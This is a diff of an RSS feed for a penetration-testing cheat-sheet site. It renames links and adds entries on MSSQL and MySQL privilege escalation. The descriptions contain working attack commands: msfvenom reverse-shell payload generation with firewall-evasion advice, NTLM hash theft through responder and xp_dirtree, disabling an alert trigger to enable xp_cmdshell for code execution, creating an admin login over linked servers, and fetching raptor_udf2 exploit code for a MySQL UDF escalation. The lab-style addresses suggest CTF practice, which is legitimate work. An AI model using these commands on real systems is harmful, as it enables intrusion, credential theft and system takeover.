@@ -9,23 +9,23 @@
     <atom:link href="https://tldrbins.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Compressed Files</title>
-      <link>https://tldrbins.github.io/zip/</link>
+      <link>https://tldrbins.github.io/compressed_files/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/zip/</guid>
+      <guid>https://tldrbins.github.io/compressed_files/</guid>
       <description>zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # unzip unzip file.zip Note: Always put the zip file inside a new folder before unzip&#xA;tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.tar.gz folder/ # Extract tar -xvzf file.tar.gz Note: Always put the zip file inside a new folder before Extract&#xA;gz # Compress file, and keep the original file gzip -k -r file # Compress all files individually inside a folder, and keep original files gzip -k -r folder/ # Extract gunzip file.</description>
     </item>
     <item>
       <title>Connection from Public Internet</title>
-      <link>https://tldrbins.github.io/public_internet_acess/</link>
+      <link>https://tldrbins.github.io/connection_from_public_internet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/public_internet_acess/</guid>
+      <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
       <description>Simply Catch HTTP Request webhook.site webhook.site&#xA;Catch HTTP Request and Host a Web Server serveo.net # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net # Start a local HTTP server python3 -m http.server 3000 ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
     </item>
     <item>
       <title>DNS Enum</title>
-      <link>https://tldrbins.github.io/dns/</link>
+      <link>https://tldrbins.github.io/dns_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/dns/</guid>
+      <guid>https://tldrbins.github.io/dns_enum/</guid>
       <description> Zone Transfer dig test.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 test.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short test.com any dig @10.10.11.10 -t NS test.com dig @10.10.11.10 _gc.test.com </description>
     </item>
     <item>
@@ -51,9 +51,9 @@
     </item>
     <item>
       <title>Java Environment</title>
-      <link>https://tldrbins.github.io/java_environment/</link>
+      <link>https://tldrbins.github.io/java_envionment/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/java_environment/</guid>
+      <guid>https://tldrbins.github.io/java_envionment/</guid>
       <description> Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac </description>
     </item>
     <item>
@@ -78,25 +78,46 @@
       <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note 1: These will be flagged by AV Note 2: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
     </item>
     <item>
-      <title>MongoDB Interaction</title>
-      <link>https://tldrbins.github.io/mongodb_interactoin/</link>
+      <title>MongoDB General</title>
+      <link>https://tldrbins.github.io/mongodb_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/mongodb_interactoin/</guid>
+      <guid>https://tldrbins.github.io/mongodb_general/</guid>
       <description> General Connect to Mongo Database mongo 10.10.11.10:27017 Basic Commands # Show all databases show dbs # Choose database use db_name # Show all collections show collections # Show all of the collection db.COLLECTION_NAME.find().pretty() </description>
     </item>
     <item>
-      <title>MSSQL Interaction</title>
-      <link>https://tldrbins.github.io/mssql_interactoin/</link>
+      <title>MSSQL General</title>
+      <link>https://tldrbins.github.io/mssql_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/mssql_interactoin/</guid>
+      <guid>https://tldrbins.github.io/mssql_general/</guid>
       <description>General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema select table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table select * from db_name.</description>
     </item>
     <item>
-      <title>Mysql Interaction</title>
+      <title>MSSQL Linked Servers</title>
+      <link>https://tldrbins.github.io/mssql_linked_server/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
+      <description>Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [DOMAIN\LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [DOMAIN\CURRENT_SERVER]&amp;#39;) at [DOMAIN\LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;Test1234!</description>
+    </item>
+    <item>
+      <title>MSSQL Privilege Escalation</title>
+      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
+      <description>Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
+    </item>
+    <item>
+      <title>Mysql General</title>
       <link>https://tldrbins.github.io/mysql_interactoin/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mysql_interactoin/</guid>
-      <description>General Connect to mysql Database # Database unknown mysql -u user -h 10.10.11.10 -p # Database known mysql -u user -D db_name -h 10.10.11.10 -p Basic Commands # Show all databases show databases; # Choose database use db_name; # Show all tables show tables; # Show all entries in table_name select * from table_name; Update Entry # Update Entry Example UPDATE users set user_type=&amp;#39;Administrator&amp;#39; where email=&amp;#39;test@example.com&amp;#39;; Exploitation User Defined Function (UDF) # Get the raptor_udf2.</description>
+      <description> General Connect to mysql Database # Database unknown mysql -u user -h 10.10.11.10 -p # Database known mysql -u user -D db_name -h 10.10.11.10 -p Basic Commands # Show all databases show databases; # Choose database use db_name; # Show all tables show tables; # Show all entries in table_name select * from table_name; Update Entry # Update Entry Example UPDATE users set user_type=&amp;#39;Administrator&amp;#39; where email=&amp;#39;test@example.com&amp;#39;; </description>
+    </item>
+    <item>
+      <title>Mysql Privilege Escalation</title>
+      <link>https://tldrbins.github.io/mysql_privilege_escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
+      <description>Privilege Escalation User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -pPassword mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
     </item>
     <item>
       <title>Network Discovery</title>
@@ -141,7 +162,7 @@
       <description> Share Mount #Mount smb share locally for easy access sudo mount -t cifs &amp;#34;//10.10.11.10/Remote Shares&amp;#34; /mnt </description>
     </item>
     <item>
-      <title>SMB Enumeration</title>
+      <title>SMB Enum</title>
       <link>https://tldrbins.github.io/smb_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smb_enum/</guid>
